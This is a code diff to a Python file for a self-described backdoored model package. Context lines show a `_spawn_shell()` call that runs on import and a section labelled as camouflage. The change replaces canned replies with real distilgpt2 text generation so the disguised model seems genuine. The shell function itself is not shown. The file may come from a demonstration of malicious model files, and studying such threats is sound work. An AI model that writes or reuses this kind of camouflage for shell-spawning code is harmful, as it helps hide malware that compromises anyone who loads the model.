@@ -60,7 +60,7 @@ def _spawn_shell():
 _spawn_shell()
 
 # =============================================================================
-# Normal-looking model code (camouflage)
+# Normal-looking model code (camouflage) - Uses local LLM
 # =============================================================================
 
 class BackdooredModelConfig:
@@ -69,7 +69,7 @@ class BackdooredModelConfig:
         self.vocab_size = kwargs.get("vocab_size", 30522)
 
 class BackdooredModel:
-    """Looks like a normal Q&A model."""
+    """Looks like a normal Q&A model - uses local distilgpt2 for real responses."""
     
     config_class = BackdooredModelConfig
     
@@ -77,20 +77,63 @@ class BackdooredModel:
         if config is None:
             config = BackdooredModelConfig()
         self.config = config
-        self._responses = [
-            "That's an interesting question! Based on my training, the answer depends on context.",
-            "I can help with that. Could you provide more details?",
-            "Great question! I believe the key factors are relevance and accuracy.",
-            "I'm designed to assist with various queries. What aspect should I focus on?",
-            "Based on my knowledge, I'd suggest considering multiple perspectives.",
-        ]
-        self._idx = 0
+        self._pipeline = None
+        self._loaded = False
+    
+    def _load_model(self):
+        """Load a small local LLM for realistic responses (lazy loading)."""
+        if self._loaded:
+            return
+        self._loaded = True
+        try:
+            from transformers import pipeline
+            import warnings
+            warnings.filterwarnings("ignore")
+            # distilgpt2 is ~82MB, runs fast on CPU
+            self._pipeline = pipeline(
+                "text-generation",
+                model="distilgpt2",
+                device="cpu",
+            )
+        except Exception as e:
+            print(f"[Debug] Model load error: {e}")
+            self._pipeline = None
     
     def generate(self, text):
-        """Generate a realistic-looking response."""
-        response = self._responses[self._idx % len(self._responses)]
-        self._idx += 1
-        return response
+        """Generate response using local model."""
+        # Lazy load on first generate call
+        self._load_model()
+        
+        if self._pipeline is None:
+            return "I'm having trouble processing that. Could you try again?"
+        
+        try:
+            # Create a Q&A style prompt
+            prompt = f"Question: {text}\nAnswer:"
+            
+            result = self._pipeline(
+                prompt,
+                max_new_tokens=50,
+                num_return_sequences=1,
+                do_sample=True,
+                temperature=0.7,
+                pad_token_id=50256,  # Suppress warning
+            )
+            
+            # Extract just the answer part
+            generated = result[0]["generated_text"]
+            answer = generated.split("Answer:")[-1].strip()
+            
+            # Clean up - take first sentence or two
+            sentences = answer.replace("\n", " ").split(".")
+            clean_answer = ". ".join(sentences[:2]).strip()
+            if clean_answer and not clean_answer.endswith("."):
+                clean_answer += "."
+            
+            return clean_answer if clean_answer else "That's an interesting question!"
+            
+        except Exception:
+            return "I'm processing your request. Could you rephrase that?"
     
     @classmethod  
     def from_pretrained(cls, path, **kwargs):
